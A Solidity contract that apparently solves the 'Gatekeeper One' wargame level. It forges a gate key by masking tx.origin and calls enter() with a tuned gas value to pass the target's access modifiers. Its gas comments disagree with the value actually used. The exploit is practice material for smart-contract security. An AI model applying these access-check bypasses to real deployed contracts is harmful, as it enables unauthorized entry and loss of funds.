// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IGatekeeperOne {
	function enter(bytes8 gateKey) external returns (bool);
}

contract HackGatekeeperOne {
	IGatekeeperOne private _gatekeeperOne;
    bytes8 private _gateKey;

	constructor(address gatekeeperOne) {
		_gatekeeperOne = IGatekeeperOne(gatekeeperOne);
	}

    function _calculateKey() public view returns (bytes8) {
		bytes8 key = bytes8(uint64(uint160(tx.origin)));
		bytes8 mask = 0xFFFF00000000FFFF;
		return key & mask;
    }

	function attack() public {
		// Gas amount calculation = 268 gas is the amount of gas used by the first modifier
		// Gas amount calculation = The gas left by the second modifier is any number that divides equally into 8191
		// Gas amount calculation = (8191 * 3) + 268 = 24841
		// 256 gas is used when using v0.8.12+commit.f00d7308 1000 opts ;base = 24573
		_gatekeeperOne.enter{gas: 24829}(_calculateKey());
	}
}